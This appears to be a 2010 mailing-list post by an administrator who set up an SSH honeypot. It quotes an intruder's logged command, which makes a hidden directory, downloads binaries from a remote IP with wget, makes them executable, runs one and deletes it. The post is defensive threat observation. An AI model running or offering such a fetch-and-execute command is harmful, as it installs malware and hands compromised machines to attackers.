Subject: SSH scans, i caught one

Hi,

I got tired of all ssh scans the past few months so I've set up a 
Kojoney honeypot
to see what the hell they were trying. This is what they try:

2010/11/17 21:22 CET [SSHChannel session (0) on SSHService 
ssh-connection on SSHServerTransport,27,84.51.138.193] executing command 
"cd /var/tmp;mkdir .scan;wgethttp://93.184.100.76:2700/pwn/syslgd;wget 
<https://webmail.lan-services.nl/exchweb/bin/redir.asp?URL=http://93.184.100.76:2700/pwn/syslgd;wget> 
http://93.184.100.76:2700/pwn/ssh;chmod 
<https://webmail.lan-services.nl/exchweb/bin/redir.asp?URL=http://93.184.100.76:2700/pwn/ssh;chmod> 
u+x syslgd ssh;./syslgd;rm syslgd"

So I downloaded all his files from the /pwn/ directory. The funny part 
is, most of them are MIPS files(?).
Also there are a lot of IRC config-like files.

For anyone who's interested, this is what they try/download the moment 
they can login.

Have a nice day,
